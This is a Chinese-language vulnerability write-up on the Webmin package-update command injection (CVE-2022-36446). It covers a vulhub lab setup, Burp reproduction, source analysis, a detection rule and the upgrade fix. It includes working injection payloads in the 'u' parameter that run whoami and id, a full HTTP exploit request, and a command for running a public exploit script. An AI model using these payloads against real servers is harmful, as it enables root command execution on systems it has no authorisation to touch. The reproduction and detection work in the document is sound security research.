## 0x01 漏洞介绍

威胁等级： **严重**

Webmin是功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。在版本1.997之前的Webmin中存在一个任意命令注入漏洞，触发该漏洞需登录Webmin。

#

  

## 0x02 漏洞影响范围

WebMin版本小于1.997

#

  

## 0x03 漏洞利用条件

  * 此漏洞需身份验证；
  * 并且该账户必须有权限访问软件包更新模块，需要访问“Software Package Updates”模块才能触发漏洞；

#

  

## 0x04 漏洞复现

###  **环境搭建**

1\. 使用vulhub搭建环境，把vulhub下载到本地。

git clone <https://github.com/vulhub/vulhub>

![](https://image.3001.net/images/20221104/1667529888_63647ca01723be6a54778.png!small)

  

2\. 进入vulhub/webmin/CVE0=-2019-15107，使用此环境进行CVE-2022-36446漏洞复现。

    
    
    docker-compose up -d   #  启动漏洞环境
    docker-compose ps      # 查看漏洞环境映射的端口

![](https://image.3001.net/images/20221104/1667529987_63647d03871e33c603c5d.png!small)

  

3\. 访问https://ip:10000，出现以下界面表示环境部署成功。

![](https://image.3001.net/images/20221104/1667530067_63647d5312f643e08aeaa.png!small)

  

4\. 接下来需要修改webmin的密码，需要进入容器中修改。

    
    
    docker ps     # 查看漏洞环境容器id
    docker exec -it 容器id /bin/bash    # 进入容器内部
    cd /usr/share/webmin/                     # 进入容器内的/usr/share/webmin/目录下
    ./changepass.pl /etc/webmin root root   # 将root密码设置为root

![](https://image.3001.net/images/20221104/1667530120_63647d8825b80bfab478f.jpg!small)

###

### 漏洞复现

1\. 以上设置完之后，使用root/root登录webmin。

![](https://image.3001.net/images/20221104/1667530160_63647db0e57fe723c857f.png!small)

  

2\. 抓取登录后的任意数据包。

![](https://image.3001.net/images/20221104/1667530187_63647dcbf034b30f5262f.png!small)

  

3\. 发送到Repeater模块，更改请求方式为POST。

![](https://image.3001.net/images/20221104/1667530244_63647e04a72d3b42fe8e7.png!small)

  

4\. 更改请求路径为/package-updates/update.cgi ，添加payload，发送请求，返回包中出现命令执行结果。

    
    
    mode=new&search=ssh&redir=&redirdesc=&u=0%3Bwhoami%3B&confirm=Install%2BNow

![](https://image.3001.net/images/20221104/1667530268_63647e1c9570f771c2910.png!small)

    
    
    POST /package-updates/update.cgi HTTP/1.1
    Host: X.X.X.X:10000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    X-Requested-From: mount
    X-Requested-From-Tab: webmin
    X-Requested-With: XMLHttpRequest
    Connection: close
    Referer: https://X.X.X.X:10000/mount/?xnavigation=1
    Cookie: redirect=1; testing=1; sid=75eb9d34c1642057244dc271fb980bf6
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 71
    
    mode=new&search=ssh&redir=&redirdesc=&u=0%3Bid%3B&confirm=Install%2BNow

![](https://image.3001.net/images/20221104/1667530292_63647e349842bd7b44a42.png!small)

###

### EXP

也可直接通过脚本进行漏洞利用，EXP地址：<https://github.com/p0dalirius/CVE-2022-36446-Webmin-Software-Package-Updates-RCE>。

    
    
    python3 CVE-2022-36446.py -t https://X.X.X.X:10000/ -u root -p root -k -I

![](https://image.3001.net/images/20221104/1667530316_63647e4c7a6f5571fb939.png!small)

有可能会出现以下报错

![](https://image.3001.net/images/20221104/1667530345_63647e696daf04f340cfc.png!small)

将CVE-2022-36446.py文件中的soup = BeautifulSoup(r.content, 'lxml') 全部改为soup =
BeautifulSoup(r.content, 'html.parser')，再重新执行即可。

![](https://image.3001.net/images/20221104/1667530356_63647e74ed82d1995b51c.png!small)

##

  

## 漏洞分析

 **命令执行** **：**

当应用需要调用外部程序处理某些内容的情况下，就会用到一些执行系统命令的函数，比如最常见的php中的system、exec、shell_exec等等。当用户可以控制命令执行函数中的参数时，就可以注入一些恶意的系统命令到正常的命令中，造成命令执行攻击。

Webmin是目前功能最强大的基于web的unix系统管理工具，管理员通过浏览器访问webmin的各种管理功能并完成相应的管理动作。

Webmin使用操作系统包管理器（apt、yum等）来执行包更新和安装。由于缺乏输入清理（1.997之前的Webmin中的software/apt-lib.pl缺少UI命令的HTML转义），可以注入将连接到包管理器调用的任意命令。

此漏洞需要 **身份验证** ，并且该账户必须 **有权限访问软件包更新模块** ，用户可以通过在新软件包安装期间执行系统命令，并以root权限运行命令。

![](https://image.3001.net/images/20221104/1667530433_63647ec1b581aa40b7e77.png!small)

  

该模块在/package-updates/文件夹下开发。其中有一个update.cgi文件，该文件中第39行使用参数U指定用户的包名称，并在第50行检查请求中是否存在“confirm”参数。第57行，如果请求中没有“confirm”参数，就会调用带有变量“pkgnames”的“list_package_operations()”函数，其中存储了包名。

![](https://image.3001.net/images/20221104/1667530458_63647edaef3865d89df1e.png!small)

  

通过/package-updates/update.cgi文件的第4行可知道，“list_package_operations”函数位于“pakage-updates-lib.pl”文件中。

![](https://image.3001.net/images/20221104/1667530468_63647ee46cf52278437be.png!small)

  

“list_package_operations()”函数定义于pakage-updates-lib.pl文件的第408行。此函数将“$name”的值（即包名）发送到第412行中名为software文件中的“update_system_operations()”函数。

![](https://image.3001.net/images/20221104/1667530479_63647eef1fd9bc3bd8a06.png!small)

再通过搜索功能找到定义update_system_operations()函数的文件为apt-lib.pl和yum-lib.pl。

顾名思义，apt-lib.pl文件使用的是apt包，yum-lib.pl文件使用的是yum包。两者所做的工作是相同的，但是因为运行Webmin的系统和该系统的包管理器不同，所以只是文件中的某些命令会不同，故分析哪个文件都可以

查看/software/apt-lib.pl文件，在第75行定义了update_system_operations()函数。第83行，通过“backquote_command()”函数来执行系统命令，也是通过此函数对系统运行的命令进行安全控制，也防止用户在此注入命令。

![](https://image.3001.net/images/20221104/1667530497_63647f01baffe22f5e831.png!small)

  

再继续看update.cgi文件，如果需要安装一个包，则会调用第129行的“package_install()”函数。

![](https://image.3001.net/images/20221104/1667530507_63647f0b7141b68166b3c.png!small)

  

通过查找，package_install()函数位于“package-updates-lib.pl”文件中第300行。查看函数内容发现，“update_system_install()”函数是通过“$name”变量调用的，它是用户在第345行给出的包名（从之前的分析得出，这些函数是在apt-lib.pl文件中定义的）。

![](https://image.3001.net/images/20221104/1667530518_63647f16443369a663331.png!small)

![](https://image.3001.net/images/20221104/1667530527_63647f1f8b97ad4025cdf.png!small)

  

再查看apt-lib.pl文件，找到相关函数。

第18行看到函数的第一个参数（即用户之前发送的包名）被分配给“$update”变量。

第26行，“$update”变量被包含在了命令中，而且没有做任何的控制机制。

第46行发现，相关的命令会直接在系统上执行，也是没有做任何的控制机制。

所以，用户可以通过在新的软件包安装请求中提供“confirm”参数，并在软件包中指定在系统上运行命令的值，以root权限在系统上执行命令。

![](https://image.3001.net/images/20221104/1667530540_63647f2c0fbdbdd96ee6e.png!small)

#

  

# 0x05 检测POC规则编写

    
    
    params:
    - mode=new&search=ssh&redir=&redirdesc=&u=0%3Bwhoami%3B&confirm=Install%2BNow
    name: Webmin命令执行漏洞（CVE-2022-36446）
    set: {}
    rules:
    - method: POST
      path: /package-updates/update.cgi
      headers:
        Cookie: redirect=1; testing=1; sid=75eb9d34c1642057244dc271fb980bf6
      body: mode=new&search=ssh&redir=&redirdesc=&u=0%3Bwhoami%3B&confirm=Install%2BNow
      search: ""
      followredirects: false
      expression: response.status == 200 && response.body.bcontains(b"root")
    groups: {}
    detail:
      author: ""
      links: []
      description: ""
      version: ""
    

![](https://image.3001.net/images/20221104/1667530568_63647f4884662a8e14f0b.png!small)

#

  

# 0x06 漏洞修复

1\. 升级到1.997及以上版本

2\. 补丁获取链接：

https://github.com/webmin/webmin/commit/13f7bf9621a82d93f1e9dbd838d1e22020221bdehttps://www.webmin.com/download.html

  

参考：

https://blog.csdn.net/qq_44281295/article/details/126345900

https://mp.weixin.qq.com/s/xdtN0Tt4VhTTh_R4sOC-vA

https://medium.com/@emirpolat/cve-2022-36446-webmin-1-997-7a9225af3165

#

